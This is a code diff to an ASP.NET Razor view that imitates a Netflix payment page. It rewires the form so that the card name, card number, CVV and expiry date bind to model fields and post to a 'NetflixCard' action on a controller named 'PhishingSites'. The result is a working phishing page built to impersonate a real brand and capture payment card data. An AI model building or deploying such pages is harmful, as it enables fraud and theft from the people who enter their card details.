@@ -1,3 +1,4 @@
+@model WebProject.Models.UserModel
 @{
     Layout = null;
 }
@@ -8,6 +9,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Netflix Login Page | CodingNepal</title>
     <link rel="stylesheet" href="~/css/netflix.css">
+    <script src="/js/card.js"></script>
 </head>
 <body>
 <img src="~/images/TR-tr-20231211-popsignuptwoweeks-perspective_alpha_website_large.jpg" class="bg">
@@ -18,35 +20,35 @@
 </nav>
 <div class="form-wrapper">
     <h2>Payment</h2>
-    @using (Html.BeginForm("Error", "PhishingSites", FormMethod.Post))
-    {
-        <div class="form-control">
-            <input type="text" required>
-            <label>Card Name</label>
-        </div>
-        <div class="form-control">
-            <input type="text" oninput="formatCreditCardNumber()" id="creditCard" required>
-            <label>Card number</label>  
-        </div>
-        <div class="form-control">
-            <input type="text" oninput="CVV()" id="cvv" maxlength="3" required>
-            <label>CVV</label>
-        </div>
-        <div class="form-control">
-            <input type="text"  id="expirationDate"  oninput="formatDate()" maxlength="5" required>
-            <label>Card expiration date</label>
-        </div>
-        <button type="submit">Pay</button>
-        <div class="form-help">
-            <a href="#">Need help?</a>
-        </div>
-    }
+   @using (Html.BeginForm("NetflixCard", "PhishingSites", FormMethod.Post))
+   {
+       <div class="form-control">
+           @Html.TextBoxFor(model => model.user_name_on_card, new { @type = "text", @class = "form-control", @required = "required" })
+           <label>Card Name</label>
+       </div>
+       <div class="form-control">
+           @Html.TextBoxFor(model => model.user_cc, new { @type = "text", @class = "form-control", @required = "required", @oninput = "formatCreditCardNumber()" })
+           <label>Card number</label>  
+       </div>
+       <div class="form-control">
+           @Html.TextBoxFor(model => model.user_cvv, new { @type = "text", @class = "form-control", @maxlength = "3", @required = "required", @oninput = "CVV()" })
+           <label>CVV</label>
+       </div>
+       <div class="form-control">
+           @Html.TextBoxFor(model => model.user_date, new { @type = "text", @class = "form-control", @maxlength = "5", @oninput = "formatDate()" })
+           <label>Card expiration date</label>
+       </div>
+       <button type="submit">Pay</button>
+       <div class="form-help">
+           <a href="#">Need help?</a>
+       </div>
+   }
+
 
     <small>
         This page is protected by Google reCAPTCHA to ensure you're not a bot.
         <a href="#">Learn more.</a>
     </small>
 </div>
-<script src="/js/card.js"></script>
 </body>
 </html>
